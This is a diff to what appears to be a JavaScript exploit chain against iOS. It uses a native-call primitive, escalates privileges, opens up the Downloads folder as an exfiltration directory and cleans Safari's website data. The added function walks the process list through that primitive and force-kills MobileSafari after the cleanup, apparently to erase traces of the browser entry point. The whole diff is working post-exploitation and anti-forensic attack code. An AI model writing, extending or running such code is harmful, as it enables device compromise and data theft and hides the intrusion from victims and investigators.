@@ -8471,6 +8471,7 @@ const POWERCUFF_TWEAK_LABEL = "Powercuff";
 const ENABLE_THREEAPP = !!globalThis.__ls_enable_threeapp;
 const ENABLE_SAFARI_ORIGIN_AUDIT = true;
 const ENABLE_SAFARI_ORIGIN_DELETE = true;
+const ENABLE_SAFARI_KILL_AFTER_CLEAN = true;
 // sbcustomizer_light.js dispatches to the SpringBoard main thread
 // asynchronously. When it runs without Powercuff piggybacking on it, keep the
 // chain alive briefly so the dispatched main-thread work has time to run
@@ -8719,6 +8720,98 @@ function runOptionalStage(label, enabled, fn) {
 	} catch (e) {
 		LOG("[PE] " + label + " exception: " + String(e));
 		return false;
+	}
+}
+
+function terminateSafariAfterClean() {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	const PROC_ALL_PIDS = 1;
+	const SIGTERM = 15;
+	const SIGKILL = 9;
+	const MAX_PID_SCAN_BYTES = 65536;
+
+	function getProcName(pid) {
+		let buf = Native.callSymbol("malloc", 128n);
+		if (!buf || buf === 0n) return "";
+		try {
+			let ret = Native.callSymbol("proc_name", pid, buf, 128);
+			if (Number(ret) <= 0) return "";
+			return Native.readString(BigInt(buf), 128).replace(/\0/g, "");
+		} finally {
+			Native.callSymbol("free", buf);
+		}
+	}
+
+	function getProcPath(pid) {
+		let buf = Native.callSymbol("malloc", 1024n);
+		if (!buf || buf === 0n) return "";
+		try {
+			let ret = Native.callSymbol("proc_pidpath", pid, buf, 1024);
+			if (Number(ret) <= 0) return "";
+			return Native.readString(BigInt(buf), 1024).replace(/\0/g, "");
+		} finally {
+			Native.callSymbol("free", buf);
+		}
+	}
+
+	function isSafariProcess(name, path) {
+		if (name === "MobileSafari") return true;
+		let lowerPath = String(path || "").toLowerCase();
+		return lowerPath.indexOf("/mobilesafari.app/mobilesafari") >= 0;
+	}
+
+	function nativeErrno() {
+		let ep = Native.callSymbol("__error");
+		return ep ? Native.read32(BigInt(ep)) : -1;
+	}
+
+	let needed = Number(Native.callSymbol("proc_listpids", PROC_ALL_PIDS, 0, 0n, 0));
+	if (!isFinite(needed) || needed <= 0) needed = 4096;
+	let scanBytes = needed + 4096;
+	if (scanBytes > MAX_PID_SCAN_BYTES) scanBytes = MAX_PID_SCAN_BYTES;
+	let pidBuf = Native.callSymbol("malloc", BigInt(scanBytes));
+	if (!pidBuf || pidBuf === 0n) {
+		LOG("[SAFARI-CLEAN] safari-kill failed: malloc pid buffer");
+		return false;
+	}
+
+	let currentPid = Number(Native.callSymbol("getpid"));
+	let matched = 0;
+	let signaled = 0;
+	try {
+		let got = Number(Native.callSymbol("proc_listpids", PROC_ALL_PIDS, 0, pidBuf, scanBytes));
+		if (!isFinite(got) || got <= 0) {
+			LOG("[SAFARI-CLEAN] safari-kill proc_listpids failed ret=" + got);
+			return false;
+		}
+		if (got > scanBytes) got = scanBytes;
+		let data = Native.read(BigInt(pidBuf), got);
+		let view = new DataView(data);
+		let count = Math.floor(got / 4);
+		for (let i = 0; i < count; i++) {
+			let pid = view.getInt32(i * 4, true);
+			if (pid <= 0 || pid === currentPid) continue;
+			let name = getProcName(pid);
+			let path = getProcPath(pid);
+			if (!isSafariProcess(name, path)) continue;
+			matched++;
+			let ret = Native.callSymbol("kill", pid, SIGTERM);
+			let errno = Number(ret) === 0 ? 0 : nativeErrno();
+			LOG("[SAFARI-CLEAN] safari-kill pid=" + pid + " name=" + name + " ret=" + ret + " errno=" + errno + " path=" + path);
+			if (Number(ret) === 0) {
+				signaled++;
+				Native.callSymbol("usleep", 250000);
+				if (Number(Native.callSymbol("kill", pid, 0)) === 0) {
+					let hardRet = Native.callSymbol("kill", pid, SIGKILL);
+					let hardErrno = Number(hardRet) === 0 ? 0 : nativeErrno();
+					LOG("[SAFARI-CLEAN] safari-kill hard pid=" + pid + " ret=" + hardRet + " errno=" + hardErrno);
+				}
+			}
+		}
+		LOG("[SAFARI-CLEAN] safari-kill done matched=" + matched + " signaled=" + signaled);
+		return signaled > 0 || matched === 0;
+	} finally {
+		Native.callSymbol("free", pidBuf);
 	}
 }
 
@@ -9455,7 +9548,10 @@ function start() { LOG("[+] PE start() called");
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
 	LOG("[PE] Exfil dir: " + filzaDst);
 
-	runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
+	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
+	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
+		runOptionalStage("Safari app termination", true, terminateSafariAfterClean);
+	}
 
 	let agentPid = 0;
 	if (ENABLE_SPRINGBOARD_AGENT) {
